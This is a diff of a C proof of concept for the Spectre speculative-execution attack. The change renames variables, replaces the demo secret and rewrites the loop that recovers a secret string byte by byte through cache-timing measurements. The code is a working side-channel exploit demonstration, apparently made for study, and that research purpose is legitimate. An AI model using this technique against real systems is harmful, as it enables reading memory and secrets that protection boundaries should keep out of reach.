@@ -12,13 +12,9 @@
 **********************************************************************/
 
 #include <stdio.h>
-#include <stdlib.h>
 #include <stdint.h>
-#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
-#include <sched.h>
 #include <string.h>
 #include "memory_function.h"
-#include "helper_functions.h"
 
 /********************************************************************
 Victim code.
@@ -46,7 +42,7 @@ uint8_t array1[16] = {
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 
-char *secret = "The Magic Words are Squeamish Ossifrage.";
+char *secret = "Vivswan Shah";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
@@ -68,7 +64,7 @@ static inline void callVictimCodeWithFlushedCache(size_t address) {
 }
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int valueScore[2], int num_tries) {
+void readMemoryByte(int cacheHitThreshold, size_t maliciousX, int valueScore[2], int num_tries) {
     static int results[256];
     static int time;
     static int i;
@@ -86,13 +82,13 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int valueScore[
         wait();
 
         /* Calling victim code so it loads data to cache */
-        callVictimCodeWithFlushedCache(malicious_x);
+        callVictimCodeWithFlushedCache(maliciousX);
 
         /* Time reads. Order is lightly mixed up to prevent stride prediction */
         for (i = 0; i < 256; i++) {
             int mix_i = ((i * 167) + 13) & 255;
             time = (int) memaccesstime(&array2[mix_i * 512]);
-            if (time <= cache_hit_threshold && mix_i != array1[num_tries % array1_size])
+            if (time <= cacheHitThreshold && mix_i != array1[num_tries % array1_size])
                 results[mix_i]++;
         }
     }
@@ -108,35 +104,46 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int valueScore[
 }
 
 int main() {
-    int num_tries = 1000;
-    int cacheHitThreshold = getCacheHitThresholdTime(10000);
+    const int num_tries = 1000;
+    const int maxStringSize = 1000;
 
-    size_t malicious_x = (size_t) (secret - (char *) array1);
-    char foundString[strlen(secret)];
+    const int cacheHitThreshold = getCacheHitThresholdTime(10000);
+    char foundSecret[maxStringSize];
+
+    size_t maliciousX = (size_t) (secret - (char *) array1);
     int valueScore[2];
 
     /* write to array2 so in RAM not copy-on-write zero pages */
-    for (int i = 0; i < (int) sizeof(array2); i++) array2[i] = 1;
+    for (int i = 0; i < (int) sizeof(array2); i++) array2[i] = 0;
 
-    /* Print cache hit threshold */
     printf("Using a cache hit threshold of %d.\n", cacheHitThreshold);
-    printf("Reading %d bytes:\n", (int) sizeof(foundString));
+    printf("Reading %lu bytes:\n", strlen(secret));
 
-    /* Start the read loop to read each address */
-    for (int i = 0; i < (int) sizeof(foundString); i++) {
-        readMemoryByte(cacheHitThreshold, malicious_x, valueScore, num_tries);
-        foundString[i] = (char) valueScore[0];
-        foundString[i + 1] = '\0';
+    int index = 0;
+    while (1) {
+        if (index > maxStringSize) break;
+
+        readMemoryByte(cacheHitThreshold, maliciousX, valueScore, num_tries);
+        foundSecret[index] = (char) valueScore[0];
+        foundSecret[index + 1] = '\0';
+        if (foundSecret[index] == '\0') break;
 
         /* Display the results */
-        printf("Speculatively accessed virtual address %p ", (void *) malicious_x);
-        printf("Got secret: %03d = '%c' ", foundString[i], foundString[i]);
+        printf("Speculatively accessed virtual address %p ", (void *) maliciousX);
+        printf("Got secret: %03d = '%c' ", foundSecret[index], foundSecret[index]);
         printf("Success Rate: %04d/%d", valueScore[1], num_tries);
         printf("\n");
 
-        malicious_x++;
+        maliciousX++;
+        index++;
     }
-    printf("Secret: %s\n", secret);
-    printf("Found : %s", foundString);
+
+    int match = strcmp(secret, foundSecret);
+
+    printf("\n");
+    printf("Secret: \"%s\"\n", secret);
+    printf("Found : \"%s\"\n", foundSecret);
+    printf("Match : %s\n", match == 0 ? "true" : "false");
+
     return 0;
 }
